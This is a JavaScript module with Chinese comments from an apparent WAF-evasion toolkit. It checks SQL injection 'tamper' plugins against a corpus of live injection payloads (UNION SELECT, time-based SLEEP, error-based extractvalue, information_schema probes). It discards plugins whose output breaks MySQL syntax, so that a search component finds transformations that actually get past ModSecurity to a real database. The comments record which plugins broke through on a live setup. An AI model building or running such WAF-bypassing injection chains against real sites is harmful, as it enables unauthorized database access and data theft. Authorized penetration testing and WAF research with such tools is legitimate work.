// ============================================================================
// semanticIntegrity.js —— tamper 弹药的**实测派生**与**语义完整性**判据
// [批次 D15 2026-10-08]
//
// ■ 为什么要有这个模块（两件实证，不是设计推演）
//   ① 弹药库有一半用不上：`buildSemanticIndex()` 实测 234 个插件里
//      curated 46 / family 77 / **unclassified 111（47%）**，而 `selectByAvoiding`
//      把 unclassified 整批排除（"不认识的不敢用"）。致命的是 —— 真机**唯一**打穿的
//      `unionvaluesrow` / `unionvalues` 正在这 111 个里 ⇒ 定向搜索器**永远生成不出**
//      那条链，它只能靠人工对拍后写进静态推荐表（D4）才出现。
//   ② 弹药库里有假货：`sap` / `lad` / `dhs` / `accessfilter` / `squiggle` / `aspjetty`
//      的输出是 `UN/**/ION` / `UN~~ION` / `UN%00ION` —— **标识符内部被插入分隔符**，
//      与 D14 真机证伪的 randomcomments 词内形态同型（MySQL 把注释当分隔符 ⇒
//      `UN ION` 是两个标识符 ⇒ 整条语法错误）。它们能过 WAF（破坏整词匹配）却拼不出
//      可执行的 SQL，正是「放行 19/19、打穿 0/19」的机理来源。
//
//   ⇒ 本模块不猜、不按名字推，一律用**插件自己的 transform 在语料上实测**：
//      · 派生的 eliminates/introduces 让"没名分但真有本事"的弹药进得了候选池；
//      · 结构不变量把"过了 WAF 但 SQL 必挂"的插件标为 `semanticUnsafe` 请出候选池。
//
// ■ 不变量只收「结构性必然破坏」，不收启发式（保守判据，对齐 A3 的既定纪律）
//   ① `inword-split`：插入片段落在**标识符内部**。判据不是"出现 字母/注释/字母"
//      （那会把合法的 `UNION/**/SELECT` 误杀 —— 它在词**间**），而是
//      「插入点的前后文拼起来能在原文里**连续**找到」：词间插入处原文有空白，
//      拼不成连续串 ⇒ 不命中；词内插入处原文是字母紧邻 ⇒ 命中。
//   ② `unclosed-comment`：块注释未闭合（`/*` 与 `*/` 计数不等）。
//      实证 `halfversionedmysql` / `halfversionedmorekeywordsopen` 输出 `/*!0UNION`
//      不闭合 ⇒ 整段留在注释里 ⇒ 真 MySQL 根本解析不到（D14 同类判决）。
//
// ■ 诚实边界
//   · 本模块判的是「变换是否**破坏 SQL 结构**」，**不判**能否过 WAF、能否取到数据。
//     打穿仍然只有真机（modsec-live + 真 MySQL）能判 —— 别拿本模块的数字当战力。
//   · 派生是**形态层**的（词在不在），不是语义等价证明：`eliminates:['select']`
//     只说明 `select` 这个词没了，不说明换来的写法等价。等价性由插件自身的
//     单测与真机对拍负责。
// ============================================================================

import { tamperRegistry } from '../../tamper/TamperRegistry.js';
import '../../tamper/applyTampers.js'; // 副作用：注册内置插件

/**
 * 派生用语料：覆盖**真实注入形态**，而不是只喂一条 union。
 * 为什么必须多条：条件型插件（commalessmid 只认 `SUBSTRING(a,1,1)`、if2case 只认 `IF(...)`、
 * greatest/least 只认比较符）在单一语料上表现为 nop ⇒ 会被误判成"没本事"而排除。
 * 语料里每加一条都要问：它是否代表一类**逃逸前提不同**的形态。
 * @type {string[]}
 */
export const PROBE_CORPUS = [
  "1' UNION SELECT 1,2,3-- -",
  '1 AND 1=1',
  "1' AND SLEEP(5)-- -",
  "1' AND extractvalue(1,concat(0x7e,version()))-- -",
  '1 UNION ALL SELECT 1,2,3,4',
  "1' AND (SELECT SUBSTRING(version(),1,1))='5'-- -",
  "1' ORDER BY 3-- -",
  "1' AND IF(1=1,1,2)-- -",
  "1' AND (SELECT 1 FROM information_schema.tables LIMIT 1)-- -",
  "1' AND ASCII(SUBSTR(user(),1,1))>1-- -",
  // 无 FROM 标量子查询（引擎报错取数的真实模板形态）—— scalarselectinline 只认这个；
  // 没有它，D3 那件原创插件会被判成 nop 而永远进不了候选池。
  "1' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
  // 字符串字面量形态 —— hexliterals / quote2hex / concat2hex / apostrophe2char 的触发面；
  // 只有数字和裸标识符的语料测不出它们（实测 changed=0，属语料缺口不是插件没本事）。
  "1' UNION SELECT 'abc','def'-- -",
];

/**
 * 派生时追踪的关键词（小写）。只收"出现在语料里、且被 WAF 词表关照"的词 ——
 * 挂太长的表会让 eliminates 里塞满噪声词，反而让 covers 打分失真。
 * @type {string[]}
 */
export const DERIVE_KEYWORDS = [
  'union', 'select', 'all', 'and', 'or', 'from', 'where', 'order', 'by',
  'sleep', 'extractvalue', 'updatexml', 'concat', 'version', 'substring', 'mid',
  'ascii', 'if', 'limit', 'information_schema', 'values', 'row', 'count', 'like',
];

/** 词边界匹配（大小写不敏感） */
const wordRe = (w) => new RegExp(`(?:^|[^A-Za-z0-9_])${w}(?:$|[^A-Za-z0-9_])`, 'i');

/**
 * 判「关键词是否还在」之前，先把**传输层编码**还原成空白再看字面。
 *
 * 为什么必须还原：URL 编码会留下**数字尾巴** —— `UNION` 前的空格被编成 `%09` 后，
 * 输出形如 `1'%09UNION`，而 `9` 是词字符 ⇒ 词边界判据失配 ⇒ 明明还在的 `UNION`
 * 被算成"已消失"。实测中 randomwhitespace / bluecoat / overlongutf8 就是这样
 * 被误派生出「消除 union/select」的（它们只换了空白，关键词字面根本没动）。
 * ⇒ 不还原就会把一批空白族错认成"消除关键词的强弹药"，直接污染 covers 打分。
 *
 * 只还原**纯传输编码**（%XX / &#..; / \\uXXXX / \\NNN），不动 `0x53514c49` 这类
 * 语义层构造 —— 后者是真正的形态改写，字面确实消失了。
 * @param {string} s
 * @returns {string}
 */
export function normalizeForToken(s) {
  return String(s)
    .replace(/%[0-9A-Fa-f]{2}/g, ' ')
    .replace(/&#x?[0-9A-Fa-f]+;?/gi, ' ')
    .replace(/\\(?:u[0-9A-Fa-f]{4}|[0-7]{3})/g, ' ');
}

/**
 * 插入片段：会被 WAF 当成"词被打散"的东西，也是假弹药最爱用的手法。
 * 只列**分隔符性质**的（不是任意注释 —— 块注释本身合法，位置才决定对错）。
 */
const INSERTIONS = [/\/\*[\s\S]*?\*\//g, /~~/g, /%00/gi];

/** 片段两侧各取多少字符做上下文（够拼出 UNION/SELECT 即可） */
const CTX = 12;

/**
 * 不变量 ①：插入片段是否落在**标识符内部**。
 *
 * 判据：取片段两侧紧邻的字母数字串 pre/post，若原文里 `pre+post` 能作为**连续子串**
 * 找到 ⇒ 原文此处是字母紧邻（词内），插入把它拆开了 ⇒ 破坏标识符。
 * 词间插入（原文有空白）拼不出连续串 ⇒ 不命中（合法）。
 *
 * @param {string} input 原文
 * @param {string} output 变换后
 * @returns {string[]} 命中证据（人读）
 */
export function findInwordSplit(input, output) {
  const hits = [];
  const inLower = String(input);
  for (const re of INSERTIONS) {
    re.lastIndex = 0;
    let m;
    while ((m = re.exec(output)) !== null) {
      const start = m.index;
      const end = start + m[0].length;
      const pre = (output.slice(Math.max(0, start - CTX), start).match(/[A-Za-z0-9_]+$/) || [''])[0];
      const post = (output.slice(end, end + CTX).match(/^[A-Za-z0-9_]+/) || [''])[0];
      if (pre && post && inLower.toLowerCase().includes((pre + post).toLowerCase())) {
        hits.push(`${pre}[${m[0]}]${post}`);
      }
      if (m[0].length === 0) re.lastIndex += 1; // 防零宽匹配死循环
    }
  }
  return [...new Set(hits)];
}

/** 统计子串出现次数（非重叠） */
function countOf(s, sub) {
  let n = 0;
  let i = s.indexOf(sub);
  while (i !== -1) {
    n += 1;
    i = s.indexOf(sub, i + sub.length);
  }
  return n;
}

/**
 * 不变量 ②：块注释未闭合。`/*!` 也算开注释（MySQL 版本注释形态）。
 * @param {string} output
 * @returns {string[]} 命中证据
 */
export function findUnclosedComment(output) {
  const open = countOf(output, '/*');
  const close = countOf(output, '*/');
  if (open === close) return [];
  return [`/* x${open} vs */ x${close}`];
}

/**
 * 不变量表。新增不变量必须同时给出：① 至少一条**真实插件**命中；② 至少一条
 * 合法插件不命中（防"全判坏"）。由 waf.semanticIntegrity.test.js 的反向钉子守。
 * @type {Array<{id:string, title:string, detect:(out:string, input:string)=>string[]}>}
 */
export const INVARIANTS = [
  { id: 'inword-split', title: '标识符内部被插入分隔符（MySQL 视作两个标识符）', detect: (out, input) => findInwordSplit(input, out) },
  { id: 'unclosed-comment', title: '块注释未闭合（整段留在注释里）', detect: (out) => findUnclosedComment(out) },
];

/**
 * 单插件审计：实测派生 + 不变量检查。
 * @param {string} name 插件名
 * @returns {{name:string, exists:boolean, changed:number, brokenOn:number, eliminates:string[], introduces:string[], eliminatesAll:boolean, violations:Array<{id:string, evidence:string[], onCorpus:number}>, error?:string}}
 */
export function auditPlugin(name) {
  const p = tamperRegistry.get(name);
  if (!p || typeof p.transform !== 'function') {
    return { name, exists: false, changed: 0, brokenOn: 0, eliminates: [], introduces: [], eliminatesAll: false, violations: [] };
  }
  const eliminated = new Set();
  const introduced = new Set();
  const violations = [];
  let changed = 0;
  let error;
  /**
   * 至少命中一个不变量的**语料条数**（**诊断字段，不参与出局判据**）。
   *
   * 与 `changed` 一起给出"覆盖率"视图，回答"这件弹药是件件都坏，还是只坏一部分形态"：
   * `brokenOn === changed` ⇒ 它改动过的每一条语料都被破坏。
   *
   * [D16 2026-10-08 真机复核 —— 一次被推翻的改动动机，留此备查]
   * 曾打算按覆盖率把判据从「∃ 一条命中就出局」放宽为「全命中才出局」，依据是真机报告里
   * `misunion` 直连上界 5/19、`lad` 1/19（看着像"部分可用 ⇒ 误杀"）。**复核后反转**：
   * 那两个数字**全部由 nop 样本贡献** —— `misunion` 未改动的 12 条样本里打穿 5 条，
   * 而它真正改动的 7 条**一条都没打穿**；`lad` 同型（nop 2 条里打穿 1 条，改动的 17 条全挂）。
   * ⇒ 真机证据**支持**原判据（12/12 全对），没有误杀。放宽反而会放进 `randomboundary`
   * 这类"部分命中但真机 0/19 打穿"的噪声件。
   * ⇒ 出局判据保持原样；本字段只作诊断，以及将来做"链/样本级过滤"时的输入。
   */
  let brokenOn = 0;
  /** 整串消除计数：在多少条语料上「输入里的关键词**全部**消失」 */
  let allGoneOn = 0;

  for (const input of PROBE_CORPUS) {
    let out;
    try {
      out = p.transform(String(input), {});
    } catch (e) {
      error = String(e && e.message ? e.message : e).slice(0, 120);
      continue;
    }
    out = String(out);
    if (out === input) continue; // 该语料上没作用，不参与派生（形态不匹配，不是没本事）
    changed += 1;
    let brokenHere = false; // 本语料是否被任一不变量判为破坏
    // 字面是否还在 → 看**解码后**的形态（见 normalizeForToken 的踩坑说明）
    const seen = normalizeForToken(out);
    const presentIn = DERIVE_KEYWORDS.filter((k) => wordRe(k).test(input));
    let gone = 0;
    for (const k of DERIVE_KEYWORDS) {
      const hasIn = wordRe(k).test(input);
      const hasOut = wordRe(k).test(seen);
      if (hasIn && !hasOut) { eliminated.add(k); gone += 1; }
      if (!hasIn && hasOut) introduced.add(k);
    }
    // 整串消除：输入里出现的关键词**全没了**（编码族的特征），且确实有词可消
    if (presentIn.length > 0 && gone === presentIn.length) allGoneOn += 1;
    for (const inv of INVARIANTS) {
      const ev = inv.detect(out, input);
      // ⚠️ 这里的 else 必须加大括号：`if (cur) for (...) if (x) A; else B;` 的 else
      //    会被解析进**内层** if（dangling else）⇒ 首次命中（cur 为 undefined）永不入账，
      //    表现为"检测函数明明命中、violations 却是空的"。2026-10-08 实测踩到。
      if (ev.length) {
        brokenHere = true;
        const cur = violations.find((v) => v.id === inv.id);
        if (cur) {
          cur.onCorpus += 1;
          for (const e of ev) if (!cur.evidence.includes(e)) cur.evidence.push(e);
        } else {
          violations.push({ id: inv.id, evidence: [...ev], onCorpus: 1 });
        }
      }
    }
    if (brokenHere) brokenOn += 1;
  }
  return {
    name,
    exists: true,
    changed,
    brokenOn,
    eliminates: [...eliminated].sort(),
    introduces: [...introduced].sort(),
    // 兜底弹药标记：与 CORE_SEMANTICS 的 eliminatesAll 同义（整串编码/转义）。
    // 要求「≥2 条语料且条条都全消」—— 单条语料的巧合不足以把一件插件定性为编码族。
    eliminatesAll: allGoneOn >= 2 && allGoneOn === changed,
    violations,
    ...(error ? { error } : {}),
  };
}

/** @type {Map<string, ReturnType<typeof auditPlugin>>|null} */
let _audit = null;

/**
 * 全库审计（懒加载 + 缓存）。234 个插件 × 10 条语料，一次性纯计算，无 I/O。
 * @param {{force?:boolean}} [opts]
 * @returns {Map<string, ReturnType<typeof auditPlugin>>}
 */
export function auditAll(opts = {}) {
  if (_audit && !opts.force) return _audit;
  const m = new Map();
  for (const p of tamperRegistry.all()) m.set(p.name, auditPlugin(p.name));
  _audit = m;
  return m;
}

/**
 * 语义不可用名单：命中任一「结构性必然破坏」不变量的插件。
 * 这些插件过了 WAF 也拼不出可执行的 SQL ⇒ 不进定向搜索的候选池（D14/D15 同一条标准）。
 *
 * [D16 2026-10-08] 出局判据 = **命中任一不变量**（不做覆盖率放宽），已过真机复核：
 * CI run 37788832263 的 PL1 报告逐件核对 12 件 → 判据 12/12 正确（含此前被怀疑的
 * `misunion` 与 `lad` —— 它们各自的"直连上界"全部来自 nop 样本，变换生效的样本全打不穿）。
 * 复核方法与读法见 `e2e/waf-real/modsec-live.mjs` 的 `nopCount` 与报告「口径」第 5 条。
 * @returns {Map<string, Array<{id:string, evidence:string[], onCorpus:number}>>}
 */
export function semanticUnsafeRegistry() {
  const out = new Map();
  for (const [name, r] of auditAll()) {
    if (r.violations && r.violations.length) out.set(name, r.violations);
  }
  return out;
}

/**
 * 单插件是否语义不可用（供 searcher / selectByAvoiding 逐个查）。
 * @param {string} name
 * @returns {boolean}
 */
export function isSemanticallyUnsafe(name) {
  return semanticUnsafeRegistry().has(name);
}
